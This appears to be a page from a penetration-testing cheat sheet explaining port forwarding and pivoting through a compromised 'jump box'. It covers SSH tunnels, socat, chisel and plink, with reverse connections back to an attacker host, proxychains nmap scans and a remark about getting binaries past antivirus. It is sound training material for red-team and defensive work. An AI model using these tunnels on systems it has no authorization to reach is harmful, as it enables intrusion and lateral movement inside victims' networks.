# Port Forwarding

## Theory

Port forwarding involves using any compromised host as a jump box to pivot to other hosts to which we do not have direct access from our attacking host. We configure the compromised host to listen on one port and relay all packets received on that port to another destination.

There are two main types of port forwarding: local and remote.

* **Local port forwarding**:  Open a local port on the compromised server and redirect incoming traffic to an other port on the same host or a different host in a remote network.
* **Remote port forwarding**: Open a local port on our attacking server and redirect incoming traffic to a port on a remote machine through a compromised intermediary machine (the jump box).
* **Dynamic port forwarding (Forward Proxy)**: tunnel the whole attacker's network traffic (instead of only one port) through a remote machine.
* **Remote dynamic port forwarding (Reverse Proxy)**: tunnel the whole network traffic from a remote machine through the attacker's machine.

## Practice

### SSH tunneling

By using a SSH client with an OpenSSH server, it's possible to create both forward (local) and reverse (remote) connections to make [SSH tunnels](portfwd.md#ssh-tunneling), allowing us to forward ports, and/or create proxies.

* **SSH Local Forwarding:** It redirects a specific port from the server we connect to via SSH back to the client. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to the SSH server. Then, the server connects to a configured destination port, possibly on a different machine than the SSH server.
* **SHH Remote forwarding:** Allows a client machine of an SSH connection to redirect one of its ports to a port on the server, or to redirect a port of a network machine from the SSH server to a port local to the server.
* **SSH Dynamic port forwarding (Forward Proxy)**: The SSH client creates a local SOCKS proxy server port.
* **SSH Reverse dynamic port forwarding (Reverse Proxy)**: The SSH client creates a remote SOCKS proxy server port on the SSH server.

{% hint style="info" %}
Microsoft has introduced its native implementation of the OpenSSH server for Windows. So this technique may works with both UNIX and Windows servers/clients.
{% endhint %}

{% tabs %}
{% tab title="Local Forwarding" %}
This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine (attacking machine) to port 80 of intra.example.com.

```bash
# -L : Specify a local port forwarding
#      [bind_address]:attacking_host_local_port:destination_ip:destination_local_port
# -f : Backgrounds the shell immediately
# -N : Don't execute any commands
veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
```
{% endtab %}

{% tab title="Remote Forwarding" %}
On the compromised computer (jump-box), we can connect back to the attacking machine with a reverse port forward using the following command, this example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`

```bash
PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -i KEYFILE -o StrictHostKeyChecking=no -fN
```

{% hint style="info" %}
Since we'll be making a connection back to our attacking machine, we'll create a user with limited console access for tunneling and assign a dedicated password for tunnel management.

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
{% endhint %}

{% hint style="info" %}
Ensure to generate SSH keys for the tunnel user, and subsequently, add the generated public key to both the `authorized_keys` file and the jump box.
{% endhint %}
{% endtab %}

{% tab title="Forward Proxy" %}
its possible to create a **Dynamic Port Forwarding (Forward proxy)** using SSH.&#x20;

For example, by using the following command on our attacking host, SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be pushed through the SSH tunnel to the Jump Host, then forwarded wherever they are addressed.

```bash
# -D : dynamic port forward
# [BIND_IP:BIND_PORT]
v4resk@kali$ ssh -D 127.0.0.1:9090 user@jump-server.net -fN
```

Once configured, you can use `proxychains` to run applications through the proxy network connections.

```bash
v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
```

{% hint style="info" %}
A little reminder on how to config ProxyChains. In this example, we just have to add the following line to `/etc/proxychains.conf`:

```bash
socks5 127.0.0.1 9090
```
{% endhint %}
{% endtab %}

{% tab title="Reverse Proxy" %}
In newer versions of the SSH client, it is also possible to create a **Reverse Proxy** (the equivalent of the `-D` switch used in local connections). This **may not work in older clients**, but this command can be used to create a reverse proxy in clients which do support it.

By using this command on the compromised host (jump box), SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be pushed through the SSH tunnel to the jump box, then forwarded wherever they are addressed.

```bash
PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
```

Once configured, you can use `proxychains` to run applications through the proxy network connections.

```bash
v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
```

{% hint style="info" %}
A little reminder on how to config ProxyChains. In this example, we just have to add the following line to `/etc/proxychains.conf`:

```bash
socks5 127.0.0.1 9090
```
{% endhint %}
{% endtab %}
{% endtabs %}

### SOCAT

We can use static binaries of socat to pivot, they are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86\_64.zip/download).

{% hint style="danger" %}
Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.
{% endhint %}

{% tabs %}
{% tab title="Local Forwarding" %}
Setting up a **Local port forward** with SOCAT involves opening a listening port on the compromised server and redirecting incoming traffic to a target server.

Using this command on the Jump-Box will open port 33060 on it, and forward any connection from this port to port 3306 on 172.16.0.10.

```bash
PC> ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
{% endtab %}

{% tab title="Remote Forwarding" %}
Setting up a **reverse port forwarding** with SOCAT involves to redirect any local traffic from a port of our attacking server to a port on a remote machine via the compromised machine (jump box).  Then the jump box will redirect this traffic to the target.

This example will forward any traffic from `localhost:8000`, on our attacking machine, to `172.16.0.10:80` trough the compromised jump box.

First of all, on our attacking machine, we issue the following command:

```bash
# Creating a local port relay. 
v4resk@kali$ ./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

Next, on the compromised machine (jump box) we execute this command.&#x20;

```bash
# Create a link between port 8000 on our attacking machine, and port 80 on the intended target
# tcp:ATTACKING_IP:ATTACKING_PORT tcp:TARGET_IP:TARGET_PORT,fork &
PC> ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

{% hint style="info" %}
This method doesn't require opening up a port externally on the compromised server.
{% endhint %}
{% endtab %}
{% endtabs %}

### CHISEL

[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided).

{% tabs %}
{% tab title="Reverse Proxy" %}
Setting up a **Reverse Proxy** involves connecting from the compromised server to a listener on the attacking machine. Then, the Chisel client creates a remote SOCKS proxy server port on the Chisel Server.

On the attacking host:

```bash
v4resk@kali$ ./chisel server -p LISTEN_PORT --reverse &
```

On the compromised host, we use the following command:

```bash
www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

Once configured, you can use `proxychains` to run applications through the proxy network connection.

```bash
proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
```

{% hint style="info" %}
A little reminder on how to config ProxyChains with Chisel. We just have to add the following line to `/etc/proxychains.conf`:

```bash
socks5 127.0.0.1 1080
```
{% endhint %}
{% endtab %}

{% tab title="Local Proxy" %}
Setting up a **Forward Proxy** involves connecting from the attacking host to a listener on the compromised machine (jump box). Then, the Chisel client creates a local SOCKS proxy server port.

On the compromised host, we would use the following command:

```bash
www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
```

On the attacking host, using the following command, we will open the local `PROXY_PORT` port on our attacking host.

```bash
v4resk@kali$ ./chisel client TARGET_IP:LISTEN_PORT LOCAL_PROXY_PORT:socks
```

Like with the reverse proxy, you can use `proxychains` to run applications through the proxy network connection.

{% hint style="info" %}
**Forward proxies are less common than reverse proxies** for the same reason as why reverse shells are more prevalent than bind shells. In broad terms, outbound traffic managed by egress firewalls tends to be subjected to less strict controls than inbound connections regulated by ingress firewalls.
{% endhint %}
{% endtab %}

{% tab title="Remote Forwarding" %}
A **Remote Port Forward** is when we connect from the jumpbox to a chisel server listening on the attacking machine.

To do a reverse port forwarding with chisel, we can do as follow:

```bash
v4resk@kali$ ./chisel server -p LISTEN_PORT --reverse &
```

On the compromised host, we would use the following command. It will forward every requests sent to 8889 on the attacking host to the compromised host on localhost:6666

```bash
# ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT 
www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:8889:localhost:6666
```
{% endtab %}

{% tab title="Local Forwarding" %}
A Local Port Forward is when we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target (jump box) we set up a chisel server:

```bash
PC> .\chisel server -p LISTEN_PORT
```

On the attacking host, we would use the following command. It will connect to the compromised host running a chisel server, forwarding our local port `2222` to `172.16.0.10:22` (our intended target).

```bash
# LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
v4resk@kali$ ./chisel client JUMP_BOX_IP:LISTEN_PORT 2222:172.16.0.10:22
```
{% endtab %}
{% endtabs %}

## PLINK

[Plink.exe](https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html) is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool.

{% tabs %}
{% tab title="Remote Forwarding" %}
To create a reverse connection, we can execute the following command on our compromised host (jump box).

As with SSH Remote Forwarding, any connection on `ATTACKING_IP:8000` will be redirected on `172.16.0.10:80`.

```powershell
# -R LOCAL_PORT:TARGET_IP:TARGET_PORT
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 USERNAME@ATTACKING_IP -i KEYFILE -N
```

{% hint style="info" %}
Since we'll be making a connection back to our attacking machine, we'll create a user with limited console access for tunneling and assign a dedicated password for tunnel management.

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
{% endhint %}

{% hint style="info" %}
Ensure to generate SSH keys for the tunneluser, and subsequently, add the generated public key to both the `authorized_keys` file and the jump box.

To generate a Plink usable private key, we can use following bash commands

```bash
# Generate SSH keys
ssh-keygen

# Convert the private key for Plink
puttygen private_key -o private_key.ppk
```
{% endhint %}
{% endtab %}
{% endtabs %}
